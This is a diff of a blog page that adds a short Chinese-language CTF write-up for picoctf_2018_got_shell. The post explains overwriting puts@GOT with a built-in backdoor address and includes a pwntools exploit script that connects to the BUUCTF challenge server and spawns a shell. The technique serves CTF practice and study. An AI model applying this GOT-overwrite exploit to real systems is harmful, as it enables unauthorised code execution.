@@ -162,53 +162,163 @@
 
             <div class="main">
                 <div class="container">
-                    <div class="post-wrap archive">
-                        
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                buu-pwn(2)
+                            </h1>
                             
-                                <h3>
-                                    2020
-                                </h3>
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        lemon的自留地～
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2020-09-07</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">0.9
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">184</a></span>
+                                    
+                                        <span class="post-category">
+                                Category:
+                                
+                                <a href="https://l3mon629.github.io/tag/PyuFfi-Dl/">buuctf</a>
+                                
+                                <a href="https://l3mon629.github.io/tag/QDD3DbQ78b/">wp</a>
+                                
+                            </span>
+                                        
+                                            Views:
+                                            <span data-hk-page="current"> - </span>
+                                            
+                                </div>
+                                
+                        </header>
+                        
+                        <div class="post-content">
+                            <h2 id="picoctf_2018_got_shell">picoctf_2018_got_shell</h2>
+<p>有意思的题目，也不难，理清楚逻辑就能出<br>
+<img src="https://l3mon629.github.io/post-images/1599492885856.png" alt="" loading="lazy"><br>
+main函数，逻辑是输入一个地址v3存入s<br>
+然后输入v4，将v3和v4都输入s<br>
+然后v3的值被赋值给v4的地址<br>
+程序本身有后门<br>
+我们只需要把v3赋值给puts@got，然后把v4的地址赋值给后门地址<br>
+然后调用puts的时候，就会调用后门，然后拿到shell<br>
+exp</p>
+<pre><code class="language-python">from pwn import *
+
+local = 0
+if local == 1:
+	p = process('./PicoCTF_2018_got-shell')
+else:
+	p = remote('node3.buuoj.cn',28761)
+
+elf = ELF('./PicoCTF_2018_got-shell')
+#libc = ELF('./libc.so.6')
+
+def dbg():
+	context.log_level = 'debug'
+
+p.recvuntil('I\'ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?\n')
+payload = hex(elf.got['puts'])
+p.sendline(payload)
+backdoor = int(0x0804854B)
+payload = hex(backdoor)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://l3mon629.github.io/post-images/1599492985005.png" alt="" loading="lazy"></figure>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#picoctf_2018_got_shell">picoctf_2018_got_shell</a></li>
+</ul>
+</li>
+</ul>
+
+                            </div>
+                            
                                 
                                     
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>lemon的自留地～</span>
+                                            </p>
 
-                                        <article class="archive-item">
-                                            <a class="archive-item-link" href="https://l3mon629.github.io/post/axb_2019_heap/">
-                                                axb_2019_heap
-                                            </a>
-                                            <span class="archive-item-date">2020-09-07 </span>
-                                        </article>
-                                        
-                                            
-                                    
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://l3mon629.github.io/post/buu-pwn2/">https://l3mon629.github.io/post/buu-pwn2/</a></span>
+                                            </p>
 
-                                        <article class="archive-item">
-                                            <a class="archive-item-link" href="https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/">
-                                                ctfwiki-unlink—2014 HITCON stkof
-                                            </a>
-                                            <span class="archive-item-date">2020-09-06 </span>
-                                        </article>
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
                                         
-                                            
-                                    
-
-                                        <article class="archive-item">
-                                            <a class="archive-item-link" href="https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/">
-                                                unlink利用—hitcontraining_unlink
-                                            </a>
-                                            <span class="archive-item-date">2020-09-05 </span>
-                                        </article>
-                                        
-                                            
                                                 
-                    </div>
-                    <div class="pagination-container">
-                        
-                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/buu-pwn2/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=qzone&title=buu-pwn(2)&pics=https://l3mon629.github.io/images/avatar.png?v=1599493014714&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=weibo&title=buu-pwn(2) + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1599493014714 "><i class="fa fa-weibo "></i></a>
                                                         
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                        
+                        <a href="https://l3mon629.github.io/tag/PyuFfi-Dl/">#
+                                                buuctf
+                                                    </a>
+                                                    
+                        <a href="https://l3mon629.github.io/tag/QDD3DbQ78b/">#
+                                                wp
+                                                    </a>
+                                                    
+                                                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
                                                                 
-                    </div>
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/axb_2019_heap/">
+                                                                                                    axb_2019_heap
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
                 </div>
+                
+                                            
             </div>
+    </div>
+    </div>
     </div>
     
         <footer id="footer" class="footer">
@@ -271,5 +381,8 @@
                 </script>
         </div>
 </body>
+<script>
+    scroll();
+</script>
 
 </html>
